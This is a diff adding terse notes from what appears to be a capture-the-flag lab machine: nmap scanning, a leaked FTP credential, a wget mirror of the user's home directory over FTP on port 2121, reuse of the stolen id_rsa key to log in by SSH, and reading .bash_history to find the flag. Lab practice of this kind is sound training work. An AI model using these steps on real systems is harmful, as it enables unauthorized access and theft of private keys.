@@ -1,0 +1,19 @@
+target: 10.129.177.152
+ftp on port 21 ad 2121
+anonymous user has a password
+
+-sC -sV return "try being more creative" 
+adding --script-trace
+
+ceil:qwer1234
+ssh X
+    ftp check
+
+ftp port 2121: wget -m --no-passive ftp://ceil:qwer1234@10.129.177.152:2121
+got what looks like a users entire linux home dir.
+
+moved .ssh/id_rsa to ~/ssh/id_rsa 
+chmod 600 id_rsa
+ssh -v ceil@target
+#I am in. 
+Using the .bash_history from 2121 ftp i saw the user storing the flag in /home/flag/flag.txt
